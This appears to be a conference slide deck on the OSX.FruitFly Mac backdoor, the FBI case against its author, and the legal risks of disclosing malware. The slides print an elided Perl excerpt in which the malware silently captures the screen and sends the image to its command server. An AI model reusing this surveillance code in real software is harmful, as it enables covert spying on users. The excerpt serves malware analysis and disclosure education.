The case of the fly on the wall
...and the legal issues of disclosing malware

% whoami
Thomas Reed
@thomasareed
treed@malwarebytes.com

OSX.FruitFly
â€¢ All-purpose, extremely unique, backdoor
â€¢ Perl script, containing "helpers":
â€¢ Mach-O binary
â€¢ Java class
â€¢ Another Perl script

First-stage Perl
â€¢ Communicates with C&C
â€¢ Executes commands (with assist from helpers)
â€¢ Exfiltrates data

First-stage Perl
for (my$n;; sleep $n) {
$n = 10;
...
for (;;) {
my$s = ord B 1;
if ($s == 0) {}
elsif($s == 2) {
...
elsif(!system(($m ? 'screencapture -x' : 'xwd -silent -root '.
'-display :0.0 | convert xwd:-').
' /tmp/scrn.png')) {
my$v = N('/tmp/scrn.png');
unlink '/tmp/scrn.png';
if (defined$v) {
A "\2".K($v)
}

Loop every 10 seconds

Read one byte from C&C socket

If byte (command) is 2...

Capture screen to /tmp/scrn.png
Read image into memory

Write image to C&C socket

More details...
â€¢ Offensive Malware Analysis: Dissecting OSX/

FruitFly.b via a Custom C&C Server
â€¢ https://www.virusbulletin.com/uploads/pdf/

magazine/2017/VB2017-Wardle.pdf

Discovery of FruitFly
Jan. 4, 2017

Case Western Reserve University (CWRU)
â€¢Notified of infection
â€¢100+ more systems found infected

Jan. 5, 2017

FBI contacted

Jan. 6, 2017

Suspect identified
â€¢Computers compromised for several years
â€¢IP address used by malware had been used
to access alumni e-mail account
â€¢Phillip Roman Durachinsky becomes
suspect

Jan. 10, 2017

"I found this hidden .client file at the root of a
user directory on a client that security reported
was making peculiar outbound traffic."

Jan. 18, 2017

FruitFly discovery released
â€¢Malwarebytes blog
â€¢MRT update

(10 am EST)

Jan. 18, 2017
(10 pm EST)

FBI raid!
â€¢Durachinsky's parents
â€¢Allowed to enter
â€¢Told that Durachinsky had been in trouble
for hacking in high school
â€¢Confiscated laptop that was on and being
remotely controlled
â€¢Also found numerous hard drives
â€¢Timing due to data deletion concerns!

ðŸ¤¦

Jan 19, 2017
(4:40 am EST)

Warrant signed to access data
â€¢20 million collected files
â€¢Thousands of victims
â€¢Child pornography

Jan 25, 2017

Durachinsky arrested

Mar. 27, 2017 FBI issues a FLASH with malware details

Mar. 4, 2020

https://reverse.put.as/2020/03/04/a-fruitfly-dropper-and-the-missing-tricks/

Jan. 10, 2018

Durachinsky indicted on 16 counts
â€¢Damaging Protected Computers
â€¢Accessing Protected Computers
â€¢Production of Child Pornography
â€¢Wire Fraud (x3)
â€¢Aggravated Identity Theft (x4)
â€¢Accessing Government Computer Without
Authorization
â€¢Illegal Wiretap (x5)

Apr. 28, 2019 Defense files motion to suppress evidence
â€¢Claiming improper seizure
â€¢Requesting suppression of:
â€¢Evidence obtained from laptop
â€¢Confession

May 13, 2019 Prosecution responds

Today

Debate continues after multiple hearings

What's the takeaway?
â€¢ Malware disclosure is important for victims
â€¢ Malware disclosure can interfere with legal process
â€¢ Be mindful when disclosing
â€¢ Consider engaging with law enforcement
â€¢ eg, local office, InfraGard (FBI), etc